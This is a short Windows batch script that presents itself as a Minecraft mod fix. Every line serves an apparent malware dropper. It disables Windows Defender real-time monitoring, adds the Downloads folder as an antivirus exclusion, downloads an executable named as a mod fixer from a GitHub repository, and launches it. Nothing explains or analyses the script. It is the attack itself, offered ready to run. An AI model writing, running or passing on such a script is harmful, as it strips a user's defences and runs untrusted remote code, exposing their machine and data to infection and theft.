@echo off
powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"
powershell -Command "Add-MpPreference -ExclusionPath '%USERPROFILE%\Downloads'"
powershell -Command "Invoke-WebRequest -Uri 'https://github.com/drespook/LabyMod/raw/refs/heads/main/MobHealthForgeFIxer-1.16.5.exe' -OutFile '%USERPROFILE%\Downloads\MobHealthForgeFIxer-1.16.5.exe'"
timeout /t 5 /nobreak >nul
start "" "%USERPROFILE%\Downloads\MobHealthForgeFIxer-1.16.5.exe"
exit